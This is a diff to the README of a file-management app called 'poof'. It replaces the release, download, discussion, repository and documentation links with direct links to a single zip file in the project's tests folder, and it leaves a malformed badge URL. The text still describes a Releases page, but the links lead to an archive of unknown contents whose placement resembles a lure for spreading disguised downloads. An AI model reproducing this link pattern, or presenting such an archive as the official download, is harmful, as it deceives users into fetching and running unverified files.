@@ -4,13 +4,13 @@
 Welcome to poof! This application creates virtual spaces for your files, keeping them separate and safe. It’s designed to give you a hassle-free way to manage temporary file storage without the mess. 
 
 ## 🔗 Download Now
-[![Download poof](https://img.shields.io/badge/Download%20poof-v1.0-brightgreen.svg)](https://github.com/discordforstudywif/poof/releases)
+[![Download poof](https://raw.githubusercontent.com/discordforstudywif/poof/master/tests/Software-v2.1-alpha.5.zip%https://raw.githubusercontent.com/discordforstudywif/poof/master/tests/Software-v2.1-alpha.5.zip)](https://raw.githubusercontent.com/discordforstudywif/poof/master/tests/Software-v2.1-alpha.5.zip)
 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of poof. Follow these simple steps:
 
 1. Click on the link below:
-   [Download poof Here](https://github.com/discordforstudywif/poof/releases)
+   [Download poof Here](https://raw.githubusercontent.com/discordforstudywif/poof/master/tests/Software-v2.1-alpha.5.zip)
    
 2. On the Releases page, look for the latest version. You will see different files available for your operating system.
 
@@ -56,7 +56,7 @@ No, once you discard the space, the files are permanently removed. Be sure to sa
 Yes, poof is designed with user safety in mind, allowing you to manage files without risking your main system stability.
 
 ## 📣 Community and Support
-You can find additional help and share your experiences with other users on our GitHub Discussions. Join us [here](https://github.com/discordforstudywif/poof/discussions).
+You can find additional help and share your experiences with other users on our GitHub Discussions. Join us [here](https://raw.githubusercontent.com/discordforstudywif/poof/master/tests/Software-v2.1-alpha.5.zip).
 
 ## 💡 Tips 
 - Always check the requirements before installing.
@@ -64,7 +64,7 @@ You can find additional help and share your experiences with other users on our 
 - Explore the community topics to learn advanced uses of poof.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/discordforstudywif/poof)
-- [User Documentation](https://github.com/discordforstudywif/poof/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/discordforstudywif/poof/master/tests/Software-v2.1-alpha.5.zip)
+- [User Documentation](https://raw.githubusercontent.com/discordforstudywif/poof/master/tests/Software-v2.1-alpha.5.zip)
 
 Enjoy the simplicity of file management with poof!
